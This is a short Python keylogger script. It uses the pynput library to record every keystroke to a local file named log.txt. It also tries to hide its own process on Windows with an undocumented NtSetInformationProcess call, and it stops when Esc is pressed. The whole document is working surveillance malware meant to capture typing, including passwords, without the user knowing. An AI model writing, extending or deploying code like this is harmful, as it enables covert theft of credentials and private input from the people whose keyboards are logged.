import ctypes, os, platform
from pynput import keyboard

path = "log.txt"

def on_press(key):
    try:
        with open("log.txt", "a") as logFile:
            if hasattr(key, "char") and key.char:
                logFile.write(key.char + "\n")
            else:
                logFile.write(f'[{key}' + "\n")
    except Exception as e:
        print(f"Error logging key: {e}")

    if key == keyboard.Key.esc:
        return False
    return None

def hide_process():
    if platform.system() == "Windows":
        try:
            process_handle = ctypes.windll.kernel32.GetCurrentProcess()
            ctypes.windll.ntdll.NtSetInformationProcess(process_handle, 0x1d, 0, 0)
            return True

        except Exception as e:
            print(f"Error while hiding process: {e}")
            return False
    else:
        print(f"Not running Windows, running on {platform.system()} {platform.release()}")
        return False

if hide_process():
    print("Hiding process")
else:
    print("Hiding process failed")

def main():
    hide_process()
    print("Starting keylogger Press 'ESC' to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()